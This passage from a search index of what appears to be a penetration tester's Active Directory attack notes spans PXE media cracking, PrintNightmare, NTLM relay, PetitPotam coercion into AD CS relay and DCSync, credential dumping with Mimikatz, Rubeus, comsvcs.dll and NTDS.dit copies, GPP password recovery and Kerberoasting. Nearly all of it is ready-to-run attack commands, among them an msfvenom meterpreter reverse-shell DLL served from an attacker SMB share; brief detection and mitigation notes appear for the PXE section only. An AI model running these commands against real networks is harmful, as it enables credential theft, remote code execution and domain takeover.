configmgr-cryptderivekey-hashcat-module/opencl_code/m19850\\* hashcat/OpenCL/\ncd hashcat\ngit checkout -b v6.2.5 tags/v6.2.5 # change to 6.2.5\nmake\n</code></pre> <p>Then, the hash can be cracked with hashcat's module <code>19850</code> and a password wordlist:</p> <pre><code>hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Step 5: Decrypt Media and Extract Credentials</p> <p>Use <code>PXEThief</code> with option 3, providing the downloaded <code>.boot.var</code> file and the cracked password to decrypt the contents and automatically extract credentials.</p> <pre><code>python pxethief.py 3 '.\\\\&lt;...&gt;.boot.var' \"Password123!\"\n</code></pre> <p>The tool will parse the decrypted data and display any found usernames and passwords for accounts like the NAA.</p>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li> <p>Delete all downloaded artifacts from the attack machine, including the <code>.boot.var</code>, <code>.boot.bcd</code>, <code>variables.xml</code>, and the exported <code>.pfx</code> certificate file.</p> </li> <li> <p>Remove the client certificate imported by <code>PXEThief</code> from the Windows Certificate Store.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#detection","title":"Detection","text":"<ul> <li> <p>Network Monitoring: Monitor for unusual <code>tftp</code> traffic or a high volume of PXE boot requests from a single source.</p> </li> <li> <p>Log Analysis: Audit SCCM and domain controller logs for authentication events tied to the Network Access Account originating from unexpected or unmanaged IP addresses.</p> </li> <li> <p>Endpoint Monitoring: Look for the execution of <code>PXEThief.py</code> or <code>tftp.exe</code> on non-administrative workstations.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Boot%20Execution%20Environment%20PXE/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Strong Passwords: Protect the PXE boot media with a strong, complex, and long password. This makes offline cracking significantly more difficult and time-consuming.</p> </li> <li> <p>Least Privilege: Strictly enforce the principle of least privilege for the Network Access Account and any domain join accounts. They should have the absolute minimum permissions required to function.</p> </li> <li> <p>Network Segmentation: Use VLANs and firewall rules to restrict which network segments can communicate with SCCM Distribution Points on required ports (e.g., DHCP, TFTP).</p> </li> <li> <p>Regular Audits: Regularly audit and rotate the credentials used for PXE boot and within Task Sequences.</p> </li> </ul>","tags":["type/technique","tactic/TA0006","technique/T1547003","technique/T1552001","stage/initial-access","stage/credential-access","os/windows","tool/pxethief","tool/hashcat","service/sccm","service/pxe"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Windows%202000%20Computers/","title":"Pre Windows 2000 Computers","text":""},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Windows%202000%20Computers/#tldr","title":"TL;DR:","text":""},{"location":"Active%20Directory/2.%20Initial%20Compromise/Pre-Windows%202000%20Computers/#identify","title":"Identify","text":"<p>Tools: pre2k, nxc</p> <p>With creds <pre><code>pre2k auth -u &lt;user&gt; -d &lt;DOMAIN&gt; -p &lt;pass&gt; -dc-ip &lt;dcip&gt; -ldaps -save\n</code></pre> or <pre><code>nxc ldap &lt;dc-ip&gt; -u 'user' -p 'pass' -M pre2k\n</code></pre></p> <p>Without creds <pre><code>pre2k unauth -d &lt;DOMAIN&gt; -dc-ip &lt;dcip&gt; -inputfile &lt;listofcomputers&gt; -save\n</code></pre></p> <p>Note</p> <p>You can pass <code>-n</code> to check blank passwords as well</p> <p>Manual mode</p> <p>Without using the tool, you can check by identifying <code>pwdlastset: 12/31/1600 7:00:00PM</code></p> <p>Note</p> <p>The only error that indicates an auth failure is <code>KDC_ERR_PREAUTH_FAILED</code> other errors do not mean you can't authenticate</p> <p>Validate <pre><code>smbclient domain/machinename\\$:machinename@dc-ip\n</code></pre> Expected output: <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code></p>"},{"location":"Active%20Directory/2.%20Initial%20Compromise/PrintNightmare/","title":"PrintNightmare","text":"<p>https://github.com/cube0x0/CVE-2021-1675</p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/PrintNightmare/#identify","title":"Identify","text":"<p><pre><code> rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n</code></pre> <pre><code>REG QUERY \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\"\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\n    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0\n    NoWarningNoElevationOnInstall    REG_DWORD    0x1\n</code></pre></p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/PrintNightmare/#exploit","title":"Exploit","text":"<p>You need bros version of impacket <pre><code>pip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install\n</code></pre> Generate DLL payload <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=8080 -f dll &gt; timsync.dll\n</code></pre> Host payload on smbserver <pre><code>sudo smbserver.py -smb2support ITShare share\n</code></pre> Start listener, execute payload <pre><code>sudo python3 CVE-2021-1675.py domain.local/user:'password'@&lt;dcip&gt; '\\\\&lt;attackhost&gt;\\ITShare\\timesync.dll'\n</code></pre></p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/","title":"Relay Attacks","text":"<p>https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/</p> <p>Relay captures hashes to target machine for various types of access. - Only works if SMB signing is disabled or \"not required\" - Relayed creds MUST be admin on the machine</p>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/#identifying-relay-targets","title":"Identifying Relay Targets","text":"<p>Automated</p> <p>RunFinger.py included with Responder can scan the network for potential relay targets for:</p> <ul> <li>SMB</li> <li>MSSQL</li> <li>RDP</li> </ul> <pre><code>python3 RunFinger.py -i 192.168.1.0/24\n</code></pre> <p>NetExec will automatically generate a list of targets with --gen-relay-list for:</p> <ul> <li>SMB</li> </ul> <pre><code>nxc smb 192.168.1.0/24 --gen-relay-list output.txt\n</code></pre>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/#ntlmrelayx","title":"ntlmrelayx","text":"","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/Relay%20Attacks/#responder-ntlmrelayx","title":"Responder + ntlmrelayx","text":"<p>Edit responder conf: <pre><code>sudo nano /etc/responder/Responder.conf\nSMB = On ---&gt; Off\nHTTP = on ---&gt; Off\n</code></pre> Make targets list <pre><code>echo \"&lt;TargetIP&gt;\" &gt; targets.txt\n</code></pre> Run responder <pre><code>sudo responder -I eth0 -wv\n</code></pre> Start ntlmrelayx with any of these options</p> <p>Dump hashes <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support\n</code></pre> Get semi-interactive smbexec bind shell (<code>nc localhost 11000</code>) <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i\n</code></pre> Execute payload <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe\n</code></pre> Execute Command <pre><code>sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'\n</code></pre> Wait for auth attempt (or coerce auth attempt)</p>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"Active%20Directory/2.%20Initial%20Compromise/ZeroLogon/","title":"ZeroLogon","text":""},{"location":"Active%20Directory/2.%20Initial%20Compromise/ZeroLogon/#identify","title":"Identify","text":"<p>remote <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M zerologon\n</code></pre></p> <p>Note</p> <p>Don't attempt to exploit - domain take down potential</p>"},{"location":"Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/","title":"Authentication Coercion","text":""},{"location":"Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/#multi-method","title":"Multi-Method","text":"<p>Coercer will attempt 12 different methods to coerce authentication: (coercer)</p> <pre><code>python3 coercer.py coerce -l &lt;attackerIP&gt; -t &lt;targetIP&gt; -u 'user' -p 'pass' -d &lt;domain.local&gt; -v\n</code></pre>"},{"location":"Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/#petitpotam-ms-efsrpc","title":"PetitPotam (MS-EFSRPC)","text":""},{"location":"Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/#attack-requirements","title":"Attack requirements","text":"Feature / Component Required for PetitPotam Required for Full Relay to DA via AD CS EFSRPC \u2705 Yes \u2705 Yes NTLM Enabled \u2705 Yes \u2705 Yes SMB/LDAP Signing Disabled \u2705 Yes (on relay target) \u2705 Yes (on certsrv or LDAP) AD CS Installed \u274c No \u2705 Yes Vulnerable AD CS Template \u274c No \u2705 Yes EPA / Channel Binding Off \u274c No \u2705 Yes"},{"location":"Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/#identify","title":"Identify","text":"<p><pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o METHOD=PetitPotam\n</code></pre> shorthand <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o M=pe\n</code></pre></p>"},{"location":"Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/#exploit","title":"Exploit","text":"<p>https://github.com/topotam/PetitPotam https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1 </p>"},{"location":"Active%20Directory/3.%20Credential%20Theft/Authentication%20Coercion/#start-ntlmrelayx","title":"Start ntlmrelayx","text":"<p><pre><code>sudo ntlmrelayx.py -debug -smb2support --target http://CA01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController\n</code></pre> At the same time try to coerce DC to auth <pre><code>python3 PetitPotam.py &lt;attackerIP&gt; &lt;DCIP&gt;\n</code></pre> OR coerce with nxc <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o LISTENER=&lt;AttackerIP&gt; M=pe\n</code></pre></p> <p>You should receive a base64 encoded certificate in ntlmrelayx output Next, we can take this base64 certificate and use <code>gettgtpkinit.py</code> to request a Ticket-Granting-Ticket (TGT) for the domain controller. https://github.com/dirkjanm/PKINITtools.git <pre><code>python3 gettgtpkinit.py DOMAIN.LOCAL/DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache\n</code></pre> Set krb env variable <pre><code>export KRB5CCNAME=dc01.ccache\n</code></pre> Attempt DCSync <pre><code>impacket-secretsdump -just-dc-user DOMAIN/administrator -k -no-pass \"DC01$\"@DC01.DOMAIN.LOCAL\n</code></pre></p>"},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/","title":"Credential Dumping","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#locally","title":"Locally","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#mimikatz","title":"Mimikatz","text":"<p>Dump all <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n</code></pre> Output to file with log <pre><code>.\\mimikatz.exe \"log C:\\path\\to\\mimikatz.log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"log\" \"exit\"\n</code></pre> Output to file with redirection <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit &gt; C:\\path\\to\\mimi-output.txt\n</code></pre> Dump SAM (Local passwords) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::sam /patchlsadsu\" exit\n</code></pre> Dump LSA (DC) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" exit\n</code></pre> Target krbtgt (for golden ticket generation) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /inject /name:krbtgt\" exit\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#rubeus","title":"Rubeus","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#kerberos-tickets","title":"Kerberos Tickets","text":"<p>List cached tickets - Non elevated: List current users - Elevated: List everyones <pre><code>Rubeus.exe triage\n</code></pre> Specify service <pre><code>Rubeus.exe triage /service:ldap\n</code></pre> Dump tickets - Non elevated: dump current users <pre><code>Rubeus.exe dump\n</code></pre> Dump all tickets by targeting krbtgt (Elevated) <pre><code>Rubeus.exe dump /service:krbtgt\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#alternative-methods","title":"Alternative Methods","text":"<p>Save SAM and SYSTEM/SECURITY, extract locally</p> <p>note</p> <p>we will only need hklm\\sam &amp; hklm\\system, but hklm\\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts</p> <p><pre><code>reg.exe save hklm\\sam C:\\sam.save\nreg.exe save hklm\\system C:\\system.save\nreg.exe save hklm\\security C:\\security.save\n</code></pre> Dump locally <pre><code>impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL\n</code></pre> Dump lsass with task manager</p> <p>GUI access required</p> <p><code>Open Task Manager</code> &gt; <code>Select the Processes tab</code> &gt; <code>Find &amp; right click the Local Security Authority Process</code> &gt; <code>Select Create dump file</code> **A file called <code>lsass.DMP</code> is created and saved in:</p> <pre><code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\n</code></pre> <p>Rundll32.exe &amp; Comsvcs.dll Method</p> <p>Will absolutely be flagged by AV/EDR</p> <p>Get lsass PID <pre><code>tasklist /svc\n</code></pre> <pre><code>Get-Process lsass\n</code></pre> Create dumpfile with rundll32 <pre><code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n</code></pre></p> <p>With this command, we are running <code>rundll32.exe</code> to call an exported function of <code>comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code>MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code>C:\\lsass.dmp</code>).</p> <p>Use Pypykatz to Extract Credentials (on attack box) <pre><code>pypykatz lsa minidump lsass.dmp \n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#ntdsdit-dumping","title":"NTDS.dit Dumping","text":"<p>(Need DA or local admin on DC) Shadow Copy <pre><code>vssadmin CREATE SHADOW /For=C:\n</code></pre> Copying NTDS.dit from the VSS <pre><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit\n</code></pre> Dump locally <pre><code>impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#remotely","title":"Remotely","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#netexec","title":"netexec","text":"<p>LSA (local admin required) <pre><code>nxc smb 10.129.42.198 -u '' -p '' --local-auth --lsa\n</code></pre> SAM (local admin required) <pre><code>nxc smb 10.129.42.198 -u '' -p '' --local-auth --sam\n</code></pre> NTDS (DA or local admin on DC required) <pre><code>nxc smb 10.129.201.57 -u '' -p '' --ntds\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#impacket","title":"impacket","text":"<p>Dump everything (local admin required) <pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'IP' -dc-ip &lt;DCIP&gt;\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/","title":"Credential Hunting","text":"","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#lazagne","title":"LaZagne","text":"<p>https://github.com/AlessandroZ/LaZagne Hunt for passwords stored in commonly used software. All modules <pre><code>laZagne.exe all\nlaZagne.exe all -output C:\\Windows\\Tasks\n</code></pre> Decrypt domain creds (requires current users password) <pre><code>laZagne.exe all -password &lt;PASS&gt;\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#snaffler","title":"Snaffler","text":"<p>https://github.com/SnaffCon/Snaffler Will spider shares and readable directories for common credential patterns <pre><code>Snaffler.exe -s -d domain.local -o snaffler.log -v data\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#seatbelt","title":"Seatbelt","text":"<p>https://github.com/GhostPack/Seatbelt performs security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. Sometimes finding creds. <pre><code>Seatbelt.exe -group=all -outputfile=\"C:\\Windows\\Tasks\\all.txt\"\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#manual-approach","title":"Manual Approach","text":"<p><pre><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre> places we should keep in mind when credential hunting:</p> <ul> <li>Passwords in Group Policy in the SYSVOL share</li> <li>Passwords in scripts in the SYSVOL share</li> <li>Password in scripts on IT shares</li> <li>Passwords in web.config files on dev machines and IT shares</li> <li>unattend.xml</li> <li>Passwords in the AD user or computer description fields</li> <li>KeePass databases --&gt; pull hash, crack and get loads of access.</li> <li>Found on user systems and shares</li> <li>Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint</li> </ul>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#passwords-in-description-fields","title":"Passwords in description fields","text":"<p>Remote <pre><code>nxc ldap &lt;hostname&gt; -u &lt;user&gt; -p &lt;pass&gt; -M get-desc-users\n</code></pre> Local <pre><code>Import-Module powerview.ps1\n</code></pre> <pre><code>Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre></p>","tags":["AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/GPP%20Password/","title":"GPP Password","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to.</p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/GPP%20Password/#identify","title":"Identify","text":"<p>Tools: impacket, gpp-decrypt</p> <p>This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains. Groups.xml</p> <p>cpassword field</p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/GPP%20Password/#exploit","title":"Exploit","text":"<p>Check null pass first (higher severity)</p> <pre><code>impacket-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n</code></pre> <p>with creds</p> <pre><code>impacket-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n</code></pre> <p>or</p> <pre><code>nxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin\n</code></pre> <p>Then decrypt:</p> <pre><code>gpp-decrypt &lt;cpasswd&gt;\n</code></pre>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Hash%20Cracking/","title":"Hash Cracking","text":"<p>NTLM <pre><code>hashcat -m 1000 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> NetNTLMv2 <pre><code>hashcat -m 5600 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> AS-REP (Kerberos 5 AS-REP etype 23) <pre><code>hashcat -m 18200 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> Kerberoasted SPN (Kerberos 5 TGS-REP) <pre><code>hashcat -m 13100 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> - More ticket hash types can be found in the Kerberoasting sections.</p>","tags":["Lateral-Movement","Privilege-Escalation","AD"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/","title":"Kerberoasting","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#technique","title":"Technique","text":"<p>Kerberoasting is a post-exploitation attack technique that targets Microsoft Active Directory. An attacker with credentials for any valid domain account (even a low-privilege one) can request Kerberos service tickets for accounts that have a Service Principal Name (SPN) configured.</p> <p>A portion of the returned ticket-granting service (TGS) ticket is encrypted with the NTLM hash of the service account's password. The attacker captures this ticket and takes it offline to crack the password using brute-force methods. Since the cracking happens offline, it does not generate failed login events on the network, making it a stealthy way to escalate privileges by compromising potentially high-value service accounts.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#prerequisites","title":"Prerequisites","text":"<p>Access Level: A valid Active Directory domain account. No special or elevated privileges are required.</p> <p>System State: The attacker must have network access to a Domain Controller to request tickets.</p> <p>Information: The attacker needs to identify user accounts (not computer accounts) that have an SPN configured.</p> <p>Misc: Your system time must be synced with the DC</p> <p>Linux:</p> <pre><code>sudo timedatectl set-ntp off\nsudo rdate -n &lt;targetDC&gt;\n</code></pre> <p>Windows:</p> <pre><code>NET TIME /DOMAIN\nNET TIME \\\\&lt;MACHINENAME&gt; /SET /Y\nNET TIME \\\\&lt;IP Address&gt; /SET /Y\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful cracking of a service account password can lead to significant privilege escalation and lateral movement. Service accounts are often misconfigured with excessive permissions (including Domain Admin) to ensure applications work, making them high-value targets.</p> <p>OPSEC</p> <ul> <li> <p>Noise: Requesting service tickets for many SPNs in a short period can trigger alerts. A single user requesting dozens or hundreds of TGS tickets (Event ID 4769) is highly anomalous.</p> </li> <li> <p>Weak Encryption: Modern tools like Rubeus allow you to request tickets using the weaker RC4 encryption algorithm (<code>-rc4opsec</code>). While this makes cracking easier, requesting a ticket with encryption type <code>0x17</code> (RC4-HMAC) in an environment that defaults to AES is a major red flag for defenders.</p> </li> <li> <p>Honeypots: Defenders can create fake service accounts with tempting SPNs (e.g., <code>sql_prod_admin_svc</code>) and monitor them. Any ticket requests for these honeypot accounts are an immediate indicator of compromise.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#requesting-a-ticket","title":"Requesting a ticket","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#powerviewps1","title":"PowerView.ps1","text":"<p>Identify kerberoastable users</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainUser * -spn | select samaccountname\n</code></pre> <p>Request ticket</p> <pre><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n</code></pre> <pre><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#rubeus","title":"Rubeus","text":"<p>Get information about kerberoastable users</p> <pre><code>.\\Rubeus.exe kerberoast /stats\n</code></pre> <p>Kerberoast all users</p> <pre><code>.\\Rubeus.exe kerberoast \n</code></pre> <p>Useful flags:</p> <ul> <li><code>/outfile</code> outputs roasted hashes to the specified file, one per line.</li> <li><code>/tgtdeleg</code> accounts with AES enabled in <code>msDS-SupportedEncryptionTypes</code> will have RC4 tickets requested. (Doesn't work on &gt;= Win 2019)</li> <li><code>/rc4opsec</code> tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.</li> <li><code>/simple</code> output tickets one per line in the terminal</li> <li><code>/nowrap</code> don't wrap new lines and output to terminal</li> <li><code>/user:&lt;DomainUser&gt;</code> specify user to kerberoast</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#impacket","title":"Impacket","text":"<p>Kerberoast all users</p> <pre><code>impacket-GetUserSPNs domain.local/username:'password' -request -dc-ip &lt;dcip&gt;\n</code></pre> <p>Kerberoast specific user</p> <pre><code>impacket-GetUserSPNs domain.local/username:'password' -request-user &lt;user&gt; -dc-ip &lt;dcip&gt;\n</code></pre> <p>Useful flags:</p> <ul> <li><code>-outputfile</code> send output to file</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#netexec","title":"NetExec","text":"<pre><code>nxc ldap &lt;IP&gt; -u 'user' -p '' --kerberoasting &lt;OUTFILE&gt;\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#powershell-mimikatz","title":"PowerShell + Mimikatz","text":"<p>Identify kerberoastable users.</p> <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <pre><code>setspn.exe -Q */*\n</code></pre> <pre><code>Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 